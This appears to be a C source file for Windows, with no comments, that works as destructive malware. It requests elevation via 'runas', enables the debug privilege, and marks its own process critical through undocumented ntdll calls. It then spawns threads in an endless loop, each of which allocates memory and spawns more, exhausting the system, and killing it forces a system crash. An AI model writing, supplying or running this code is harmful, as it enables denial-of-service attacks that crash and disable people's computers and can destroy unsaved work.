
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <stdlib.h>

BOOL IsRunAsAdmin();
DWORD WINAPI thFunc(LPVOID);

typedef  long (WINAPI *RtlSetProcessIsCritical) (
	IN BOOLEAN    bNew,
	OUT BOOLEAN    *pbOld,
	IN BOOLEAN    bNeedScb);

typedef int(*RtlAdjustPrivilege)(ULONG,
	BOOLEAN,
	BOOLEAN,
	PBOOLEAN);

int _tmain(int argc, _TCHAR* argv[])
{
	TCHAR szPath[MAX_PATH];
	if (!IsRunAsAdmin())
	{
		if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))
		{
			SHELLEXECUTEINFO sei = { sizeof(sei) };
			sei.lpVerb = L"runas";
			sei.lpFile = szPath;
			sei.nShow = SW_NORMAL;
			ShellExecuteEx(&sei);
		}
		return 0;
	}
	else
	{
		
		HMODULE hm;
		if (hm = LoadLibrary(L"ntdll.dll"))
		{
			RtlSetProcessIsCritical rspic;
			RtlAdjustPrivilege rap;
			rspic = (RtlSetProcessIsCritical)GetProcAddress(hm, "RtlSetProcessIsCritical");
			rap = (RtlAdjustPrivilege)GetProcAddress(hm, "RtlAdjustPrivilege");
			if (rspic)
			{
				HANDLE hToken;
				if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
				{
					TOKEN_PRIVILEGES tkp;
					if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkp.Privileges[0].Luid))
					{
						BOOLEAN temp = 0;
						int result = 0;
						if (rap)
						{
							if (result = rap(tkp.Privileges[0].Luid.LowPart, TRUE, TRUE, &temp))
							{
								result = rap(tkp.Privileges[0].Luid.LowPart, TRUE, FALSE, &temp);
								CloseHandle(hToken);
								rspic(1, 0, 0);
								while (1)
								{
									CreateThread(NULL, 0, thFunc, 0, 0, 0);
								}
								FreeLibrary(hm);
							}
						}


					}
				}

			}
		}

	}
	getchar();
	return 0;
}
BOOL IsRunAsAdmin()
{
	BOOL fIsRunAsAdmin = FALSE;
	PSID pAdministratorGroup = NULL;
	SID_IDENTIFIER_AUTHORITY NtAnthority = SECURITY_NT_AUTHORITY;
	if (!AllocateAndInitializeSid(
		&NtAnthority,
		2,
		SECURITY_BUILTIN_DOMAIN_RID,
		DOMAIN_ALIAS_RID_ADMINS,
		0, 0, 0, 0, 0, 0,
		&pAdministratorGroup))
	{

		return FALSE;
	}
	else
	{
		if (!CheckTokenMembership(NULL, pAdministratorGroup, &fIsRunAsAdmin))
		{
			return FALSE;
		}
		else
		{
			return fIsRunAsAdmin;
		}
	}
}

DWORD WINAPI thFunc(LPVOID p)
{
	for (int i = 0; i < INT_MAX; i++)
	{
		malloc(1);
		CreateThread(NULL, 0, thFunc, 0, 0, NULL);
	}
	return 0;
}
